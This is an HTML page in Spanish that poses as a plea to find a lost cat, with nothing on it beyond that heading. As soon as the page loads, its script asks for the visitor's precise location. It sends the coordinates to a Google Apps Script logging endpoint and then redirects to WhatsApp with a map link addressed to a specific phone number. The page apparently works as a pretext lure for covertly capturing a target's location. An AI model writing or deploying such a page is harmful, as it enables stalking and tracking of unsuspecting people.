<!DOCTYPE HTML>
<html lang="es">
<head>
  <title>¡Por favor, ayúdanos a encontrar a nuestro gato!</title>  
  <meta charset="UTF-8">
  
  <script type="text/javascript"> 
    window.addEventListener('load', obtenerUbicacion, false);

    function obtenerUbicacion() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(enviarUbicacion, mostrarError);
        } else {
            alert('El navegador no soporta geolocalización.');
        }
    }

    function enviarUbicacion(posicion) {
        var lat = posicion.coords.latitude;
        var lon = posicion.coords.longitude;
        var exactitud = posicion.coords.accuracy;

        // URL de tu Google Apps Script
        var urlServidor = "https://script.google.com/macros/s/AKfycbzZk4nru2ohFC69JMqNUD-8z7GV7N971kp56Na6PXWY3MRpy6V3NkqesvUaeg3rBimK/exec"; 

        var datos = {
            latitud: lat,
            longitud: lon,
            exactitud: exactitud,
            timestamp: new Date().toISOString()
        };

        // Enviar datos a Google Sheets
        fetch(urlServidor, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(datos)
        })
        .then(response => response.text())
        .then(data => {
            console.log("Ubicación enviada:", data);
            document.body.innerHTML = "<h2>Ubicación enviada con éxito</h2>";
        })
        .catch(error => {
            console.error("Error al enviar la ubicación:", error);
            alert("Hubo un problema al enviar la ubicación. Inténtalo de nuevo.");
        });

        // Número de WhatsApp (incluye el código de país, sin "+")
        var numeroWhatsApp = "5215539657315"; // Reemplaza con el número correcto

        // Mensaje personalizado
        var mensaje = encodeURIComponent(`¡Hola! Acabo de ver al gato en esta ubicación: https://www.google.com/maps?q=${lat},${lon}`);

        // Esperar 2 segundos y luego abrir WhatsApp
        setTimeout(() => {
            window.location.href = `https://wa.me/${numeroWhatsApp}?text=${mensaje}`;
        }, 2000);
    }

    function mostrarError(error) {
        let mensaje;
        switch (error.code) {
            case error.PERMISSION_DENIED:
                mensaje = "No se otorgaron permisos para obtener la ubicación.";
                break;
            case error.POSITION_UNAVAILABLE:
                mensaje = "La información de ubicación no está disponible.";
                break;
            case error.TIMEOUT:
                mensaje = "Se agotó el tiempo de espera para obtener la ubicación.";
                break;
            default:
                mensaje = "Error desconocido al obtener la ubicación.";
        }
        alert(mensaje);
    }
  </script>  

</head>
<body>
  <h2>¡Ayúdanos a encontrar a nuestro gato!</h2>
</body>
</html>
